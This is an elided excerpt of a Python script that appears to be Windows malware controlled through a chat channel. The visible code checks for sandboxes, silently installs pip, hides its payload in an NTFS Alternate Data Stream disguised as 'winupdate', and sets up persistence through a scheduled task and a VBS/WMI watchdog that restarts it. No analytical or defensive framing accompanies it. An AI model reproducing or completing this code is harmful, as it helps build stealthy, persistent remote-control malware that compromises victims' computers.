...
_mutex_handle = None
ADS_FILE      = r"C:\ProgramData:winupdate_ads.py"
...
def check_sandbox():
    ...
    try:
        ...
        # tasklist instead of wmic (wmic deprecated on Win11 24H2+)
        proc = subprocess.run('tasklist', capture_output=True, text=True, creationflags=CREATE_NO_WINDOW, timeout=15)
...
# ── helper: resolve pythonw.exe (case-insensitive) ──────────────
def _get_pythonw():
    pythonw = re.sub(r'python\.exe$', 'pythonw.exe', sys.executable, flags=re.IGNORECASE)
...
def _bootstrap_pip():
    # Method 1: ensurepip (bundled with most Python installs)
    try:
        result = subprocess.run(
            [sys.executable, '-m', 'ensurepip', '--upgrade'],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30
        )
        if result.returncode == 0 and _pip_available():
            return True
    except Exception:
        pass
    ...
    try:
        ...
        fd, get_pip_path = tempfile.mkstemp(suffix='.py', prefix='getpip_')
        os.close(fd)
        urllib.request.urlretrieve('https://bootstrap.pypa.io/get-pip.py', get_pip_path)
        result = subprocess.run(
            [sys.executable, get_pip_path, '--quiet'],
...
def ensure_packages():
    ...
    if not _pip_available():
        if not _bootstrap_pip():
            # Can't get pip — backoff sleep so persistence doesn't thrash
            time.sleep(300)
            sys.exit(1)
    ...
    # Verify everything actually imported
    failed = False
...
def install_persistence():
    try:
        ...
        # ── Hide payload in Alternate Data Stream ─────────────
        try:
        ...
        target_fname = os.path.basename(target_payload)
...
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  ...
  <Actions Context="Author"><Exec><Command>{pythonw}</Command><Arguments>"{target_payload}"</Arguments></Exec></Actions>
        ...
        try:
            # Use PowerShell single-quoted string for ScriptText to avoid quote-nesting hell
            ps_command = f'''
        ...
        try:
            ...
            vbs_content = (
                ...
                f'        If InStr(1, p.CommandLine, "{target_fname}", 1) > 0 Then\n'
                f'            found = True\n'
                f'            Exit For\n'
                f'        End If\n'
                f'    Next\n'
...
async def watchdog_loop():
    ...
    while True:
        ...
        try:
            # Use CIM via PowerShell instead of wmic (deprecated on Win11 24H2+)
            res = await async_powershell(
                "Get-CimInstance Win32_Process -Filter \"Name='wscript.exe'\" | "
                "ForEach-Object { $_.CommandLine } | Out-String"
            )
...
async def on_message(message):
    ...
    if ch_name != CHANNEL_NAME: return
